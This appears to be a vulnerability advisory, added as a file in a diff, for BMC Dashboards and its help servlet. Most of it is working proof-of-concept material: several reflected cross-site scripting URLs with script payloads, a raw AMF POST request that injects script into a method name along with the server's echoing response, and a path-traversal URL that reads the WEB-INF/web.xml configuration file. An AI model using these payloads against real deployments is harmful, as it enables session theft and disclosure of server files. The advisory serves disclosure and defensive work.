@@ -1,0 +1,73 @@
+source: http://www.securityfocus.com/bid/47731/info
+
+BMC Dashboards is prone to to multiple information-disclosure and cross-site scripting issues because the application fails to properly sanitize user-supplied input.
+
+A remote attacker may leverage the cross-site scripting issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Exploiting the information-disclosure issues allows the attacker to view local files within the context of the webserver process.
+
+a)
+https://www.example.com/bmc_help2u/help_services/html/xx/<script>alert(1)</script>404.htm
+
+b)
+https://www.example.com/bmc_help2u/servlet/helpServlet2u?textareaWrap=/bmc_help2u/help_services/demos/frameTst/my0a.jsp&msg="><script>alert(1)</script>
+
+c) multiple XSS within demo pages
+https:/www.example.com/help_services/demos/helpTest.jsp?help='><script>alert(1)</script>
+
+https://www.example.com/bmc_help2u/help_services/demos/setChromeDef.jsp?bFlag=<script>alert(1)</script>&submitVals=Call+setChromeDefBoolean
+
+d) Multiple XSS as the AMF stream is unfiltered
+
+POST /bsmdashboards/messagebroker/amfsecure HTTP/1.1
+Content-Type: application/x-amf
+Host: target-domain.foo
+Content-Length: 462
+........null../58.....    ..
+.COflex.messaging.messages.RemotingMessage.timestamp.headers.operation
+
+bodysource.remotePassword.remoteUsername.parameters.messageId.timeToLive.clientId.destination.........
+#.
+DSId.DSEndpoint.IFDCEEFC2-F318-1B37-7F3A-B438E60525E0..bsd-secure-amf...getUndefinedDataSources<script>alert(1)</script>
+   ..
+.qcom.bmc.bsm.dashboards.services.facade.RequestParameters.
+#.    name.version..208Archive..1.0...
+.Cflex.messaging.io.ArrayCollection    ..
+..I3DDF906B-55F2-5E38-38C1-6A08D1AC077B..........IFDDDB883-6F0C-D935-5E7B-25CDF25C3538.-dashboardArchiveFacade
+
+results:-
+HTTP/1.1 200 OK
+Date: Sat, 02 Oct 2010 00:15:35 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Type: application/x-amf
+Content-Length: 4651
+
+......../58/onStatus.......
+.SIflex.messaging.messages.ErrorMessage.headers.rootCause
+body.correlationId.faultDetail.faultString.clientId.timeToLive.destination.timestamp.extendedData.faultCode.messageId
+..
+..acom.bmc.bsm.dashboards.util.logging.BSDException.message
+guid!localizedMessage.cause.arguments.priority.traceback.errorCode.causeSummary.System
+error. Contact your system administrator for assistance.
+.Kcom.bmc.bsm.dashboards.util.guid.Guid!uniqueIdentifier.AdZZZZZZZZJIiCvq53w9q0gerq4j8y0oq.0
+.s?flex.messaging.MessageException.errorMessage."$)logStackTraceEnablednumber
+
+codelogged.statusCode..-defaultLogMessageIntro.details#preferredLogLevel+rootCauseErrorMessage
+.
+......)Method 'getUndefinedDataSources<script>alert(1)</script>' not
+found...1Cannot invoke method 'getUndefinedDataSourcesfdd4d
+
+Consequences:
+An attacker may be able to cause execution of malicious scripting code
+in the browser of a user who clicks on a link to Remedy Knowledge
+Management based site. Such code would run within the security context
+of the target domain. This type of attack can result in non-persistent
+defacement of the target site, or the redirection of confidential
+information (i.e.: session IDs) to unauthorised third parties. No
+authentication is required to exploit this vulnerability.
+
+2) Application is vulnerable to file source code reading limited to the
+web-root.
+
+https://www.example.com/bmc_help2u/servlet/helpServlet2u?textareaWrap=/bmc_help2u/WEB-INF/web.xml
